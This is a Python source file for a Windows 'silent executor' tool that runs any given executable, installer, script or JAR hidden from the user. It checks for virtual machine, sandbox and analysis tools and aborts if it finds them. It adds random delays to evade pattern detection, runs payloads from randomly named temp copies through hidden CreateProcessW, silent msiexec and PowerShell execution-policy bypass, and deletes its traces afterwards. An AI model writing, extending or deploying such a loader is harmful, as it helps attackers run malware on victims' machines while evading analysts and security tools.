import subprocess
import sys
import os
import time
import random
import ctypes
from pathlib import Path
import tempfile
import shutil
import threading

class SilentExecutor:
    def __init__(self):
        self.running_processes = []
        self.min_delay = 0.5
        self.max_delay = 2.0
        
    def add_random_delay(self):
        """Add random delay to avoid pattern detection"""
        delay = random.uniform(self.min_delay, self.max_delay)
        time.sleep(delay)
    
    def create_temp_copy(self, file_path):
        """Create temporary copy with random name"""
        extension = Path(file_path).suffix
        random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12))
        temp_dir = tempfile.gettempdir()
        temp_file = os.path.join(temp_dir, f"{random_name}{extension}")
        
        try:
            shutil.copy2(file_path, temp_file)
            return temp_file
        except Exception:
            return file_path
    
    def check_environment(self):
        """Basic environment verification"""
        vm_indicators = [
            "vmware", "virtualbox", "vbox", "qemu", "xen",
            "sandboxie", "wireshark", "procmon", "regmon"
        ]
        
        try:
            result = subprocess.run(['tasklist'], capture_output=True, text=True, 
                                  creationflags=subprocess.CREATE_NO_WINDOW)
            processes = result.stdout.lower()
            
            for indicator in vm_indicators:
                if indicator in processes:
                    return True
        except Exception:
            pass
        
        return False
    
    def execute_native(self, file_path):
        """Execute using native Windows API"""
        try:
            kernel32 = ctypes.windll.kernel32
            
            class STARTUPINFO(ctypes.Structure):
                _fields_ = [
                    ('cb', ctypes.c_ulong),
                    ('lpReserved', ctypes.c_char_p),
                    ('lpDesktop', ctypes.c_char_p),
                    ('lpTitle', ctypes.c_char_p),
                    ('dwX', ctypes.c_ulong),
                    ('dwY', ctypes.c_ulong),
                    ('dwXSize', ctypes.c_ulong),
                    ('dwYSize', ctypes.c_ulong),
                    ('dwXCountChars', ctypes.c_ulong),
                    ('dwYCountChars', ctypes.c_ulong),
                    ('dwFillAttribute', ctypes.c_ulong),
                    ('dwFlags', ctypes.c_ulong),
                    ('wShowWindow', ctypes.c_ushort),
                    ('cbReserved2', ctypes.c_ushort),
                    ('lpReserved2', ctypes.c_char_p),
                    ('hStdInput', ctypes.c_void_p),
                    ('hStdOutput', ctypes.c_void_p),
                    ('hStdError', ctypes.c_void_p)
                ]
            
            class PROCESS_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ('hProcess', ctypes.c_void_p),
                    ('hThread', ctypes.c_void_p),
                    ('dwProcessId', ctypes.c_ulong),
                    ('dwThreadId', ctypes.c_ulong)
                ]
            
            startup_info = STARTUPINFO()
            startup_info.cb = ctypes.sizeof(STARTUPINFO)
            startup_info.dwFlags = 0x00000001  # STARTF_USESHOWWINDOW
            startup_info.wShowWindow = 0  # SW_HIDE
            
            process_info = PROCESS_INFORMATION()
            
            success = kernel32.CreateProcessW(
                None,
                file_path,
                None,
                None,
                False,
                0x00000008 | 0x00000200,  # CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP
                None,
                None,
                ctypes.byref(startup_info),
                ctypes.byref(process_info)
            )
            
            if success:
                kernel32.CloseHandle(process_info.hThread)
                kernel32.CloseHandle(process_info.hProcess)
                return True
            
        except Exception:
            return False
        
        return False
    
    def get_file_type(self, file_path):
        """Detect file type and return appropriate execution method"""
        extension = Path(file_path).suffix.lower()
        
        if extension in ['.exe', '.com', '.scr', '.bat', '.cmd']:
            return 'executable'
        elif extension in ['.msi']:
            return 'installer'
        elif extension in ['.jar']:
            return 'java'
        elif extension in ['.py']:
            return 'python'
        elif extension in ['.ps1']:
            return 'powershell'
        elif extension in ['.vbs']:
            return 'vbscript'
        else:
            return 'unknown'
    
    def execute_file(self, file_path, use_temp=True):
        """Execute file with multiple fallback methods"""
        if not os.path.exists(file_path):
            print(f"File not found: {file_path}")
            return False
        
        # Basic environment check
        if self.check_environment():
            print("Analysis environment detected. Aborting execution.")
            return False
        
        # Random delay
        self.add_random_delay()
        
        # Use temporary file if specified
        exec_file = file_path
        if use_temp:
            exec_file = self.create_temp_copy(file_path)
        
        original_name = os.path.basename(file_path)
        file_type = self.get_file_type(file_path)
        
        try:
            # Method 1: Try native execution for executables
            if file_type == 'executable' and self.execute_native(exec_file):
                print(f"✓ Executed: {original_name}")
                print("  Method: Direct execution")
                return True
            
            # Method 2: Try with shell execution
            try:
                if file_type == 'installer':
                    # MSI files need special handling
                    process = subprocess.Popen(
                        ['msiexec', '/i', exec_file, '/quiet'],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                elif file_type == 'java':
                    process = subprocess.Popen(
                        ['java', '-jar', exec_file],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                elif file_type == 'python':
                    process = subprocess.Popen(
                        ['python', exec_file],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                elif file_type == 'powershell':
                    process = subprocess.Popen(
                        ['powershell', '-ExecutionPolicy', 'Bypass', '-File', exec_file],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                elif file_type == 'vbscript':
                    process = subprocess.Popen(
                        ['cscript', '//nologo', exec_file],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                else:
                    # Method 3: Standard subprocess execution
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    startupinfo.wShowWindow = subprocess.SW_HIDE
                    
                    process = subprocess.Popen(
                        [exec_file],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL,
                        startupinfo=startupinfo,
                        creationflags=subprocess.CREATE_NO_WINDOW,
                        shell=False
                    )
                
                self.running_processes.append(process)
                
                print(f"✓ Executed: {original_name}")
                print(f"  Type: {file_type}")
                print(f"  PID: {process.pid}")
                
                # Clean up temp file after delay
                if use_temp and exec_file != file_path:
                    def cleanup_temp():
                        time.sleep(8)
                        try:
                            os.remove(exec_file)
                        except Exception:
                            pass
                    
                    threading.Thread(target=cleanup_temp, daemon=True).start()
                
                return True
                
            except FileNotFoundError:
                # Method 4: Try with shell=True as last resort
                process = subprocess.Popen(
                    exec_file,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    shell=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                self.running_processes.append(process)
                
                print(f"✓ Executed: {original_name}")
                print("  Method: Shell execution")
                print(f"  PID: {process.pid}")
                
                # Clean up temp file after delay
                if use_temp and exec_file != file_path:
                    def cleanup_temp():
                        time.sleep(8)
                        try:
                            os.remove(exec_file)
                        except Exception:
                            pass
                    
                    threading.Thread(target=cleanup_temp, daemon=True).start()
                
                return True
            
        except Exception as e:
            print(f"Error executing {original_name}: {str(e)}")
            
            # Clean up temp file on error
            if use_temp and exec_file != file_path:
                try:
                    os.remove(exec_file)
                except Exception:
                    pass
            
            return False
    
    def cleanup_traces(self):
        """Clean up system traces"""
        try:
            temp_dir = tempfile.gettempdir()
            for filename in os.listdir(temp_dir):
                if len(filename) == 16 and filename.isalnum():  # Our temp files
                    try:
                        os.remove(os.path.join(temp_dir, filename))
                    except Exception:
                        pass
        except Exception:
            pass

def main():
    executor = SilentExecutor()
    
    print("=" * 50)
    print("           EXECUTOR - made by ciclo")
    print("=" * 50)
    
    # Check for drag-and-drop file
    if len(sys.argv) > 1:
        file_path = sys.argv[1]
        print(f"File received: {os.path.basename(file_path)}")
        
        # Ask for temp file option
        use_temp = input("Use temporary file? (y/n): ").lower().startswith('y')
        
        executor.execute_file(file_path, use_temp)
        executor.cleanup_traces()
        
        input("\nPress Enter to exit...")
        return
    
    # Interactive mode
    while True:
        print("\nOptions:")
        print("1. Execute file")
        print("2. Execute with temporary file")
        print("3. Clean traces")
        print("4. Exit")
        
        try:
            choice = input("\nSelect option: ").strip()
            
            if choice == '1':
                file_path = input("File path: ").strip().strip('"').strip("'")
                if file_path:
                    executor.execute_file(file_path, use_temp=False)
                    
            elif choice == '2':
                file_path = input("File path: ").strip().strip('"').strip("'")
                if file_path:
                    executor.execute_file(file_path, use_temp=True)
                    
            elif choice == '3':
                executor.cleanup_traces()
                print("✓ Traces cleaned")
                
            elif choice == '4':
                executor.cleanup_traces()
                print("Exiting...")
                break
                
            else:
                print("Invalid option")
                
        except KeyboardInterrupt:
            print("\n\nExiting...")
            executor.cleanup_traces()
            break
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()